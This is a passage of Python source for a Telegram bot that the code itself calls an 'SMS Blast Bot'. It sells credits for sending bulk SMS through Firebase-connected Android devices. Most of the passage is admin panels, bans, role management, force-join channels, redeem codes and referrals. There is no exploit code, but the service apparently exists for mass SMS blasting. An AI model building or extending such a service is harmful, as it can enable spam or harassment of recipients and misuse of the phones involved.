    markup = InlineKeyboardMarkup(inline_keyboard=[[button]])

    reply_msg = msg.reply_to_message
    users = d.get("users", {})
    wait = await msg.answer(q(f"{em(EMOJI_BELL, '📤')} Broadcasting (with button) to <b>{len(users)}</b> users..."), parse_mode="HTML")

    ok, fail = 0, 0
    for uid_str in users:
        try:
            target = int(uid_str)
            await msg.bot.copy_message(
                chat_id=target,
                from_chat_id=reply_msg.chat.id,
                message_id=reply_msg.message_id,
                reply_markup=markup
            )
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)

    try:
        await wait.delete()
    except Exception:
        pass
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        q(
            f"{em(EMOJI_CHECK, '✅')} <b>Broadcast (with button) Done!</b>\n\n"
            f"{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>"
        ),
        reply_markup=back_kb,
        parse_mode="HTML"
    )

# ===================== REST OF OWNER/ADMIN/USER HANDLERS (kept functional, quoted) =====================

@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    try:
        await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    try:
        await safe_edit(cq.message, admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await safe_edit(cq.message, admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await safe_edit(cq.message, f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")
        return
    await safe_edit(cq.message, user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi")
    for dv in devices:
        dev_lines.append(
            f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b>\n"
            f"     {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:25]}\n"
            f"     {em(EMOJI_STAR, '📶')} SIMs: {len(dv['sims']) or 1}"
        )
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await safe_edit(cq.message,
        full,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:stats"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi")
    for dv in devices:
        dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b> — {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines)
    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"
    await safe_edit(cq.message, full,
        reply_markup=kb([(f"{sc('refresh')}", "admin:stats"), (f"{sc('back')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, prefix, 0)
    await safe_edit(cq.message, text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await safe_edit(cq.message, text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(cq.message,
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo."), parse_mode="HTML")
        return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Admin/Owner ko ban nahi kar sakte!"), parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        q(f"{em(EMOJI_CROSS, '🚫')} <b>Ban ho gaya!</b>\n<code>{ban_id}</code>"),
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(ban_id, q(f"{em(EMOJI_CROSS, '🚫')} Aapko ban kar diya gaya. Admin se contact karein."), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ Koi banned nahi!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} unban ho gaya!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await safe_edit(cq.message, back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id, q(f"{em(EMOJI_CHECK, '✅')} Aapka ban hata diya gaya. /start karein."), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    d = load()
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await cq.answer(f"Done! {mode}", show_alert=True)
    try:
        await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    owners = d.get("owners", [])
    await safe_edit(cq.message,
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await safe_edit(cq.message,
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nSuper Admin Chat ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid Chat ID bhejo."), parse_mode="HTML")
        return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(q(f"{em(EMOJI_WARNING, '⚠️')} Already super admin!"), reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Max 6!"), reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} <b>Super Admin Added!</b>\n<code>{new_id}</code>"),
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, q(f"{em(EMOJI_CROWN, '🔱')} <b>Aapko Super Admin bana diya gaya!</b>\n/start karein."), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Main owner / Hardcoded Super Admin remove nahi ho sakta!", show_alert=True)
        return
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await safe_edit(cq.message,
        f"{em(EMOJI_CROWN, '👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    admins = d.get("admins", [])
    await safe_edit(cq.message,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(admins)}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await safe_edit(cq.message,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nTelegram User ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo."), parse_mode="HTML")
        return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(q(f"{em(EMOJI_WARNING, '⚠️')} Already admin/owner!"), reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} <b>Admin Added!</b>\n<code>{new_id}</code>"),
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, q(f"{em(EMOJI_SHIELD, '🛡')} <b>Aapko Admin bana diya gaya!</b>\n/start karein."), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await safe_edit(cq.message,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        if not os.path.exists(script_path):
            script_path = _DATA_FILE.replace(".json", ".py")
            if not os.path.exists(script_path):
                script_path = "main.py"
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=q(f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — <i>{_VERSION}</i>"),
            parse_mode="HTML"
        )
    except Exception as e:
        await cq.answer(f"❌ Export failed: {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return

    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Koi activity nahi hai abhi tak.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity Log</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            action = entry.get("action", "unknown")
            uid = entry.get("uid", 0)
            details = entry.get("details", "")
            lines.append(f"[{ts}] <code>{uid}</code> — <b>{action}</b> — {details}")
        text = "\n".join(lines)

    await safe_edit(cq.message,
        text,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:activity"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    all_history = d.get("sms_history", {})
    total_entries = sum(len(v) for v in all_history.values())
    text = f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>\n\n"
    text += "<i>Per-user history unke Stats mein available hai.</i>"
    await safe_edit(cq.message, text, reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

# Force join / pricing / redeem / credits / settings — compact but working

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"
    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join Settings</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        req = f"{em(EMOJI_CHECK, '✅')} Required" if ch.get("required", True) else f"{em(EMOJI_CROSS, '❌')} Optional"
        text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [InlineKeyboardButton(
            text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
            callback_data="owner:fj:toggle"
        )],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await safe_edit(cq.message,
        f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join Channel</b>\n\n"
        f"{sc('step 1/2')}: Channel/Group ka Telegram ID bhejo:\n"
        f"<i>Example: -1001234567890</i>\n\n"
        f"<b>Note:</b> Bot ko us channel/group mein admin hona chahiye.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        ch_id = int(msg.text.strip())
    except Exception:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid channel ID bhejo (numbers only, e.g. -100xxx)."), parse_mode="HTML")
        return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(
        q(
            f"{em(EMOJI_BELL, '🔗')} <b>{sc('step 2/2')}</b>\n\n"
            f"Channel/Group ka invite link bhejo:\n"
            f"<i>Example: https://t.me/+AbCdEfGhIjK</i>"
        ),
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Valid link bhejo (https:// se start hona chahiye)."), parse_mode="HTML")
        return
    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))
    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except Exception:
        title = "Channel"
    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels
    save(d)
    await state.clear()
    await msg.answer(
        q(f"{em(EMOJI_CHECK, '✅')} <b>Channel Added!</b>\n\n{em(EMOJI_BELL, '📢')} {title}\n{em(EMOJI_GEAR, '🔗')} {link}"),
        reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ Koi channel nahi hai!", show_alert=True)
        return
    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message,
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nKaunsa channel hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d)
    await cq.answer("🗑 Channel removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    save(d)
    status = "ENABLED" if fj["enabled"] else "DISABLED"
    await cq.answer(f"Force Join {status}!", show_alert=True)
    await owner_fj_menu(cq, state)

# User side helpers

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    await cq.answer(f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)

def do_redeem_code(uid: int, code: str):
    code = code.strip().upper()
    def _redeem(d):
        codes = d.get("redeem_codes", {})
        if code not in codes:
            return ("invalid", 0)
        code_data = codes[code]
        if code_data.get("uses_left", 0) <= 0:
            return ("expired", 0)
        if uid in code_data.get("used_by", []):
            return ("used", 0)
        credits = code_data["credits"]
        add_credits(uid, credits, d, is_manual=False)
        code_data["uses_left"] = code_data.get("uses_left", 1) - 1
        code_data.setdefault("used_by", []).append(uid)
        return ("ok", credits)
    return atomic_update(_redeem)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await safe_edit(cq.message,
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna redeem code enter karein:\n<i>Example: GIFTABC123</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    code = msg.text.strip()
    await state.clear()
    status, credits = do_redeem_code(uid, code)
    if status == "invalid":
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Invalid redeem code!"), reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    if status == "expired":
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Ye code expire ho gaya hai!"), reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    if status == "used":
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!"), reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    d = load()
    await msg.answer(
        q(f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b>\n\n{em(EMOJI_MONEY, '💰')} +{credits} credits added!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>"),
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    await safe_edit(cq.message,
        f"{em(EMOJI_STAR, '👥')} <b>Referral Program</b>\n\n"
        f"Apna referral code share karein aur har successful referral pe <b>{ref_credits}</b> credits paayein!\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Your Code: <code>{code}</code>\n\n"
        f"{em(EMOJI_GEAR, '🔗')} Share Link:\n"
        f"https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})
    await safe_edit(cq.message,
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"{em(EMOJI_STAR, '📈')} Bot Total Sent: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b>\n\n<i>Abhi tak koi SMS send nahi kiya.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b> (Last 10)\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            msg_preview = entry.get("message", "")[:30]
            status = entry.get("status", "unknown")
            status_icon = em(EMOJI_CHECK, "✅") if status == "sent" else em(EMOJI_CROSS, "🛑") if status == "stopped" else em(EMOJI_WARNING, "⏳")
            lines.append(f"{i}. [{ts}] {status_icon} <code>{mask_number(num)}</code> — {msg_preview}...")
        text = "\n".join(lines)
    await safe_edit(cq.message, text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Abhi koi plan available nahi!", show_alert=True)
        return
    text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n"
    for plan in plans:
        text += f"{em(EMOJI_STAR, '📋')} <b>{plan['name']}</b>\n"
        text += f"   {em(EMOJI_MONEY, '💰')} Price: <b>{plan['price']} {plan.get('currency', 'INR')}</b>\n"
        text += f"   {em(EMOJI_GIFT, '🎁')} Credits: <b>{plan['credits']}</b>\n\n"
    rows = []
    for plan in plans:
        rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan['payment_link'], EMOJI_MONEY, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await safe_edit(cq.message,
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"{em(EMOJI_GEAR, '🤖')} Bot for sending bulk SMS via Firebase-connected Android devices.\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
